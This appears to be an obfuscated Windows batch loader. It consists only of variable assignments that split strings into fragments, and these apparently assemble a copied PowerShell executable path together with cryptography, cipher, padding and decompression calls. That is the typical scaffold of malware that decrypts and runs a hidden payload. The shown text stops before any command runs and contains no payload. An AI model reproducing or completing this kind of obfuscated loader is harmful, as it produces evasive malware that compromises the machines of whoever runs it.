@echo off
set "XquqmjAPzK=32"
set "shZRrATxGX=do"
set "ePsxXKmgaJ=rs"
set "xdSJFUWlDx=po"
set "poJKSSLPVb=s\"
set "yaDvAvtJHY=in"
set "eaLmXLCYSm=\v"
set "euOFmovuxs=0\"
set "HQkUgWdXJg=xe"
set "UIxBjGDqLu=he"
set "TMQprOsVEM=co"
set "qhBAPfSEzc=he"
set "KayREWEKay=Wi"
set "EmRFwJfqrz=nd"
set "ARdLipCgME=em"
set "kNGGlTudzD=py"
set "gfrSZVEgtO=:\"
set "iLnfWhtGsL=1."
set "QKrrzcAQDe=\W"
set "oEmBKQALmg=ws"
set "idjFPTObLK=rS"
set "ITBwoHLvMV=.e"
set "QnOThOuLmA=st"
set "eFxylbGCSa=we"
set "MXNQawFfli=y "
set "PQhBsILzZZ=we"
set "mxvQnUoLwp=Sy"
set "OLDIgXNZQR=Po"
set "TkGAXRhwpR= C"
set "khdVHzXptk=ll"
set "NUHPixwKjb=ll"
set "GWGMFevNHp=ow"
set "jbcQPWMxQx= /"
set "odAnwtqltq=cd"
set "EzmvtCEyew= %~dp0"
set "goksKnBNmR=sion"
set "haJcYeMHRD=Syst"
set "lJTnWuSfwf=am;$"
set "CqYKUnJiqf=pose"
set "cgAiAYSopE=zHhH"
set "eEaHyRTJzP=cG);"
set "OOccnPwAdt=rans"
set "lXyhTRQqXy=.Len"
set "YTxYsCopAa=th('"
set "dZjVlFLmWI=IHR "
set "jAGUjXsxqV=G, 0"
set "gAwBxsINrA=1] -"
set "vGNbUfoXeN=$Pnk"
set "WwUPlRRmAR=pher"
set "FHkpYqtbSX=Comp"
set "iJcppAMbLW=$oQN"
set "pcjXOhRNJK=ion."
set "ibHFPKryOm=KC ="
set "fRRZVVlEBI=.Com"
set "zKPItncOPO=ddin"
set "BwwcADTmAG=..-1"
set "wwrQrvalZM=brea"
set "mqLCHnWBpK=s75K"
set "xdqmIBhMsE=[Env"
set "xjAQIlGZBU= '')"
set "CHkssEgqti=rity"
set "NlqDQdybVe=pH.I"
